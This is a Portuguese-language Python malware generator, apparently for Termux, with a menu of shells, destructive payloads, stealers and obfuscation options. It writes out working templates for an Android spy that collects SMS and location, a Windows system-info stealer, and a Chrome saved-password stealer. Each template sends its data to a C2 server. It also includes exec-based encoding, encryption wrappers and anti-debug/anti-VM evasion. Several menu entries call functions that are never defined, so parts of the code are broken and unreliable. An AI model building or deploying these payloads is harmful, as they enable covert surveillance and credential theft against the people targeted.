#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import zlib
import platform
import hashlib
import json
from typing import Dict, List, Optional
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
import pygments
from pygments.lexers import PythonLexer, CppLexer
from pygments.formatters import TerminalFormatter

console = Console()

class GeradorPayloadsElite:
    def __init__(self):
        self.payloads = {
            'reverse_tcp_ssl': {
                'function': self.gerar_reverse_tcp_ssl,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Reverse Shell com criptografia SSL'
            },
            'bind_tcp_stealth': {
                'function': self.gerar_bind_tcp_stealth,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Bind Shell com técnicas de ocultação'
            },
            'limpar_disco': {
                'function': self.gerar_limpador_disco,
                'category': 'Destrutivos',
                'danger_level': 'high',
                'description': 'Sobrescreve o disco com dados aleatórios'
            },
            'ransomware_avancado': {
                'function': self.gerar_ransomware_avancado,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Criptografa arquivos com algoritmo híbrido'
            },
            'termux_espiao': {
                'function': self.gerar_termux_espiao,
                'category': 'Termux',
                'danger_level': 'high',
                'description': 'Módulo de espionagem para Android'
            },
            'cpp_keylogger': {
                'function': self.gerar_cpp_keylogger,
                'category': 'C++',
                'danger_level': 'high',
                'description': 'Keylogger em C++ com anti-debug'
            },
            'injetor_processo': {
                'function': self.gerar_injetor_processo,
                'category': 'Avançados',
                'danger_level': 'high',
                'description': 'Injeção de código em processos'
            },
            'windows_stealer': {
                'function': self.gerar_windows_stealer,
                'category': 'Stealers',
                'danger_level': 'high',
                'description': 'Coleta informações do Windows'
            },
            'browser_stealer': {
                'function': self.gerar_browser_stealer,
                'category': 'Stealers',
                'danger_level': 'high',
                'description': 'Rouba credenciais de navegadores'
            }
        }
        
        self.tecnicas_ofuscacao = {
            'polimorfico': 'Ofuscação polimórfica',
            'metamorfico': 'Ofuscação metamórfica',
            'criptografar_aes': 'Criptografia AES-256',
            'fragmentado': 'Fragmentação de código',
            'anti_analise': 'Técnicas anti-análise'
        }
        
        self.banners = [
            self._gerar_banner_apocaliptico(),
            self._gerar_banner_matrix(),
            self._gerar_banner_sangue()
        ]
        
        self.c2_server = "https://seu-server-c2.com/api"
        
        self._verificar_dependencias()
    
    def _gerar_banner_apocaliptico(self) -> str:
        return """
[bold red]
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌
▐░▌          ▐░▌     ▐░▌            ▐░▌▐░▌          ▐░▌       ▐░▌
▐░▌          ▐░▌      ▐░▌  ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
 ▀            ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀  
[/bold red]
[bold white on red]        GERADOR DE PAYLOADS ELITE v6.66 - DARK EDITION[/bold white on red]
"""
    
    def _gerar_banner_matrix(self) -> str:
        return """
[bold green]
          0101010 01010101 01010101 01010101 01010101 0101010
        0101010101010101010101010101010101010101010101010101010
      01010101010101010101010101010101010101010101010101010101010
    010101010101010101010101010101010101010101010101010101010101010
  0101010101010101010101010101010101010101010101010101010101010101010
01010101010101010101010101010101010101010101010101010101010101010101010
01010101010101010101010101010101010101010101010101010101010101010101010
01010101010101010101010101010101010101010101010101010101010101010101010
 0101010101010101010101010101010101010101010101010101010101010101010
   010101010101010101010101010101010101010101010101010101010101010
     01010101010101010101010101010101010101010101010101010101010
       0101010101010101010101010101010101010101010101010101010
         01010101010101010101010101010101010101010101010101010
           0101010101010101010101010101010101010101010101010
             010101010101010101010101010101010101010101010
               01010101010101010101010101010101010101010
                 0101010101010101010101010101010101010
                   010101010101010101010101010101010
                     01010101010101010101010101010
                       0101010101010101010101010
                         010101010101010101010
                           01010101010101010
                             0101010101010
                               010101010
                                 01010
                                   0
[/bold green]
[bold black on green]        SISTEMA DE GERACAO DE PAYLOADS - MATRIX MODE[/bold black on green]
"""
    
    def _gerar_banner_sangue(self) -> str:
        return """
[bold red]
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
[/bold red]
[bold white on red]        GERADOR DE PAYLOADS - EDICAO SANGUE[/bold white on red]
"""
    
    def _verificar_dependencias(self):
        required = {
            'cryptography': 'cryptography',
            'pycryptodome': 'pycryptodomex',
            'rich': 'rich',
            'pygments': 'pygments'
        }
        
        missing = []
        for pkg, install_name in required.items():
            try:
                __import__(pkg)
            except ImportError:
                missing.append(install_name)
        
        if missing:
            console.print(Panel.fit(
                f"[red]✗ Dependências faltando: {', '.join(missing)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            if Confirm.ask("Deseja instalar automaticamente?"):
                with Progress() as progress:
                    task = progress.add_task("[red]Instalando...[/red]", total=len(missing))
                    for pkg in missing:
                        os.system(f"pip install {pkg} --quiet")
                        progress.update(task, advance=1)
                console.print("[green]✓ Dependências instaladas![/green]")
                time.sleep(1)
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ USE APENAS PARA TESTES AUTORIZADOS! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def mostrar_menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]🔧 MENU PRINCIPAL[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Categoria", style="green")
            tabela.add_column("Perigo", style="red")
            
            categorias = {
                'Shells': "Shells Avançados",
                'Destrutivos': "Payloads Destrutivos",
                'Termux': "Módulos Termux",
                'C++': "Payloads C++",
                'Avançados': "Técnicas Avançadas",
                'Stealers': "Stealers de Dados"
            }
            
            for i, (cod, nome) in enumerate(categorias.items(), 1):
                perigo = "☠️ CRÍTICO" if cod == 'Destrutivos' else "⚠️ ALTO" if cod in ['Termux', 'Avançados', 'Stealers'] else "◎ MÉDIO"
                tabela.add_row(str(i), nome, perigo)
            
            tabela.add_row("0", "Configurações", "⚙️")
            tabela.add_row("9", "Sair", "🚪")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, 10)] + ['9'],
                show_choices=False
            )
            
            if escolha == "1":
                self._mostrar_submenu('Shells')
            elif escolha == "2":
                self._mostrar_submenu('Destrutivos')
            elif escolha == "3":
                self._mostrar_submenu('Termux')
            elif escolha == "4":
                self._mostrar_submenu('C++')
            elif escolha == "5":
                self._mostrar_submenu('Avançados')
            elif escolha == "6":
                self._mostrar_submenu('Stealers')
            elif escolha == "0":
                self._mostrar_menu_configuracao()
            elif escolha == "9":
                self._sair()
    
    def _mostrar_submenu(self, categoria: str):
        payloads_categoria = {k: v for k, v in self.payloads.items() if v['category'] == categoria}
        
        while True:
            console.clear()
            titulo = f"[bold]{categoria.upper()}[/bold] - Selecione"
            
            if categoria == 'Destrutivos':
                titulo = f"[blink bold red]☠️ {categoria.upper()} ☠️[/blink bold red]"
            
            tabela = Table(
                title=titulo,
                show_header=True,
                header_style="bold blue"
            )
            tabela.add_column("ID", style="cyan", width=5)
            tabela.add_column("Nome", style="green")
            tabela.add_column("Descrição")
            tabela.add_column("Perigo", style="red")
            
            for i, (nome, dados) in enumerate(payloads_categoria.items(), 1):
                icone_perigo = {
                    'medium': '⚠️',
                    'high': '🔥',
                    'critical': '💀'
                }.get(dados['danger_level'], '')
                tabela.add_row(
                    str(i),
                    nome,
                    dados['description'],
                    f"{icone_perigo} {dados['danger_level'].upper()}"
                )
            
            tabela.add_row("0", "Voltar", "Retornar", "↩️")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, len(payloads_categoria)+1)],
                show_choices=False
            )
            
            if escolha == "0":
                return
            
            nome_payload = list(payloads_categoria.keys())[int(escolha)-1]
            self._processar_payload(nome_payload)
    
    def _processar_payload(self, nome_payload: str):
        payload_data = self.payloads[nome_payload]
        
        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel.fit(
                "[blink bold red]⚠️ PERIGO ELEVADO ⚠️[/blink bold red]\n"
                "Este payload pode causar danos permanentes\n"
                "Use apenas em ambientes controlados!",
                border_style="red"
            ))
            
            if not Confirm.ask("Confirmar criação?", default=False):
                return
        
        config = self._configurar_payload(nome_payload)
        if config is None:
            return
        
        ofuscar = Confirm.ask("Aplicar técnicas de ofuscação?")
        tecnicas = []
        if ofuscar:
            tecnicas = self._selecionar_tecnicas_ofuscacao()
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando...[/red]", total=100)
            
            payload = payload_data['function'](**config)
            progress.update(task, advance=30)
            
            if ofuscar:
                for tecnica in tecnicas:
                    payload = self._ofuscar_avancado(payload, tecnica)
                    progress.update(task, advance=20)
            
            progress.update(task, completed=100)
        
        self._preview_payload(payload, 'python' if nome_payload not in ['cpp_keylogger'] else 'cpp')
        self._salvar_payload(nome_payload, payload)
    
    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
        config = {}
        
        if nome_payload in ['reverse_tcp_ssl', 'bind_tcp_stealth']:
            console.print(Panel.fit(
                "[bold]Configuração[/bold]",
                border_style="blue"
            ))
            config['ip'] = Prompt.ask("[yellow]?[/yellow] IP", default="192.168.1.100")
            config['porta'] = IntPrompt.ask("[yellow]?[/yellow] Porta", default=4444)
        
        elif nome_payload == 'ransomware_avancado':
            console.print(Panel.fit(
                "[bold red]Configuração[/bold red]",
                border_style="red"
            ))
            config['extensoes'] = Prompt.ask(
                "[yellow]?[/yellow] Extensões (separadas por vírgula)",
                default=".doc,.docx,.xls,.xlsx,.pdf,.jpg,.png,.txt"
            ).split(',')
            config['resgate'] = Prompt.ask(
                "[yellow]?[/yellow] Mensagem de resgate",
                default="Seus arquivos foram criptografados!"
            )
            config['destruir_backups'] = Confirm.ask("Destruir backups?")
        
        elif nome_payload in ['termux_espiao', 'windows_stealer', 'browser_stealer']:
            config['c2_server'] = Prompt.ask(
                "[yellow]?[/yellow] Servidor C2",
                default=self.c2_server
            )
            config['intervalo'] = IntPrompt.ask(
                "[yellow]?[/yellow] Intervalo (minutos)",
                default=15
            )
        
        console.print("\n[bold]Resumo:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not Confirm.ask("Confirmar?"):
            return None
        
        return config
    
    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
        console.print("\n[bold]Técnicas:[/bold]")
        tabela = Table(show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan", width=5)
        tabela.add_column("Técnica", style="green")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolhas = Prompt.ask(
            "[yellow]?[/yellow] Selecione (separadas por vírgula)",
            default="1,3"
        )
        
        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _preview_payload(self, payload: str, language: str = 'python'):
        console.print(Panel.fit(
            "[bold]PRÉ-VISUALIZAÇÃO[/bold]",
            border_style="yellow"
        ))
        
        lexer = PythonLexer() if language == 'python' else CppLexer()
        formatter = TerminalFormatter()
        
        lines = payload.split('\n')[:50]
        code = '\n'.join(lines)
        
        highlighted = pygments.highlight(code, lexer, formatter)
        console.print(highlighted)
        
        if len(payload.split('\n')) > 50:
            console.print("[yellow]... (truncado)[/yellow]")
    
    def _salvar_payload(self, nome_payload: str, payload: str):
        default_ext = '.py' if nome_payload not in ['cpp_keylogger'] else '.cpp'
        nome_arquivo = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo",
            default=f"payload_{nome_payload}{default_ext}"
        )
        
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            with open(nome_arquivo, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                sha256 = hashlib.sha256(f.read()).hexdigest()
            
            console.print(Panel.fit(
                f"[green]✓ Salvo como [bold]{nome_arquivo}[/bold][/green]\n"
                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def _mostrar_menu_configuracao(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]⚙️ CONFIGURAÇÕES[/bold cyan]",
                border_style="cyan"
            ))
            
            tabela = Table(show_header=False)
            tabela.add_row("1", "Alterar servidor C2")
            tabela.add_row("2", "Testar ofuscação")
            tabela.add_row("0", "Voltar")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=["0", "1", "2"],
                show_choices=False
            )
            
            if escolha == "1":
                self.c2_server = Prompt.ask(
                    "[yellow]?[/yellow] Novo servidor C2",
                    default=self.c2_server
                )
            elif escolha == "2":
                self._testar_ofuscacao()
            elif escolha == "0":
                return
    
    def _testar_ofuscacao(self):
        console.clear()
        codigo_teste = "print('Hello World')"
        
        console.print(Panel.fit(
            "[bold]TESTE DE OFUSCAÇÃO[/bold]",
            border_style="yellow"
        ))
        
        tabela = Table(title="Técnicas", show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan")
        tabela.add_column("Técnica")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolha = Prompt.ask(
            "[yellow]?[/yellow] Selecione",
            choices=[str(i) for i in range(1, len(self.tecnicas_ofuscacao)+1)],
            show_choices=False
        )
        
        tecnica = list(self.tecnicas_ofuscacao.keys())[int(escolha)-1]
        codigo_ofuscado = self._ofuscar_avancado(codigo_teste, tecnica)
        
        console.print("\nResultado:")
        console.print(Syntax(codigo_ofuscado, "python"))
        
        input("\nPressione Enter para continuar...")
    
    def _ofuscar_avancado(self, payload: str, tecnica: str) -> str:
        if tecnica == 'polimorfico':
            return self._ofuscar_polimorfico(payload)
        elif tecnica == 'metamorfico':
            return self._ofuscar_metamorfico(payload)
        elif tecnica == 'criptografar_aes':
            return self._ofuscar_com_criptografia(payload)
        elif tecnica == 'fragmentado':
            return self._ofuscar_fragmentado(payload)
        elif tecnica == 'anti_analise':
            return self._adicionar_anti_analise(payload)
        return payload
    
    def _ofuscar_polimorfico(self, payload: str) -> str:
        vars_random = [''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)) for _ in range(5)]
        
        codigo_lixo = [
            f"for {vars_random[0]} in range({random.randint(1,10)}): {vars_random[1]} = {random.randint(100,999)}",
            f"{vars_random[2]} = lambda {vars_random[3]}: {vars_random[3]}**{random.randint(2,5)}"
        ]
        random.shuffle(codigo_lixo)
        
        compressed = zlib.compress(payload.encode())
        b64_encoded = base64.b64encode(compressed)
        
        return f"""import base64,zlib
{'; '.join(codigo_lixo)}
{vars_random[4]} = {b64_encoded}
exec(zlib.decompress(base64.b64decode({vars_random[4]})))"""
    
    def _ofuscar_com_criptografia(self, payload: str) -> str:
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted = cipher.encrypt(payload.encode())
        
        return f"""from cryptography.fernet import Fernet
key = {key}
cipher = Fernet(key)
exec(cipher.decrypt({encrypted}).decode())"""
    
    def _adicionar_anti_analise(self, payload: str) -> str:
        anti_code = """
def _check_debug():
    try:
        if hasattr(sys, 'gettrace') and sys.gettrace():
            os._exit(1)
    except:
        pass

def _check_vm():
    try:
        if platform.system() == "Windows":
            import wmi
            c = wmi.WMI()
            for process in c.Win32_Process():
                if any(x in process.Name.lower() for x in ['vmware', 'vbox', 'qemu']):
                    os._exit(1)
        else:
            if any(x in open('/proc/cpuinfo').read().lower() for x in ['hypervisor', 'vmx', 'svm']):
                os._exit(1)
    except:
        pass

_check_debug()
_check_vm()
"""
        return anti_code + payload

    def gerar_termux_espiao(self, c2_server, intervalo=15, **kwargs):
        return f"""import os
import requests
from threading import Thread
from subprocess import check_output

class TermuxEspiao:
    def __init__(self):
        self.c2_server = "{c2_server}"
        self.interval = {intervalo} * 60
        
    def collect_data(self):
        return {{
            "device": check_output("uname -a", shell=True).decode(),
            "sms": check_output("termux-sms-list -l 10", shell=True).decode(),
            "location": check_output("termux-location", shell=True).decode()
        }}
    
    def send_to_c2(self, data):
        try:
            requests.post(self.c2_server, json=data, timeout=10)
        except:
            pass
    
    def run(self):
        while True:
            data = self.collect_data()
            self.send_to_c2(data)
            time.sleep(self.interval)

if __name__ == "__main__":
    spy = TermuxEspiao()
    spy.run()"""

    def gerar_windows_stealer(self, c2_server, intervalo=15, **kwargs):
        return f"""import os
import requests
import platform
import subprocess

class WindowsStealer:
    def __init__(self):
        self.c2_server = "{c2_server}"
        self.interval = {intervalo} * 60
        
    def collect_data(self):
        return {{
            "system": platform.uname()._asdict(),
            "network": subprocess.check_output("ipconfig /all", shell=True).decode(),
            "users": os.listdir("C:\\\\Users")
        }}
    
    def send_to_c2(self, data):
        try:
            requests.post(self.c2_server, json=data, timeout=10)
        except:
            pass
    
    def run(self):
        while True:
            data = self.collect_data()
            self.send_to_c2(data)
            time.sleep(self.interval)

if __name__ == "__main__":
    stealer = WindowsStealer()
    stealer.run()"""

    def gerar_browser_stealer(self, c2_server, intervalo=15, **kwargs):
        return f"""import os
import sqlite3
import requests
from Crypto.Cipher import AES

class BrowserStealer:
    def __init__(self):
        self.c2_server = "{c2_server}"
        self.interval = {intervalo} * 60
        
    def get_chrome_passwords(self):
        try:
            login_db = os.path.join(os.getenv('LOCALAPPDATA'), 
                                  'Google\\Chrome\\User Data\\Default\\Login Data')
            conn = sqlite3.connect(login_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            return cursor.fetchall()
        except:
            return []
    
    def send_to_c2(self, data):
        try:
            requests.post(self.c2_server, json=data, timeout=10)
        except:
            pass
    
    def run(self):
        while True:
            passwords = self.get_chrome_passwords()
            if passwords:
                self.send_to_c2({{"passwords": passwords}})
            time.sleep(self.interval)

if __name__ == "__main__":
    stealer = BrowserStealer()
    stealer.run()"""

    def _sair(self):
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL É CRIME! ⚠️[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        gerador = GeradorPayloadsElite()
        gerador.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
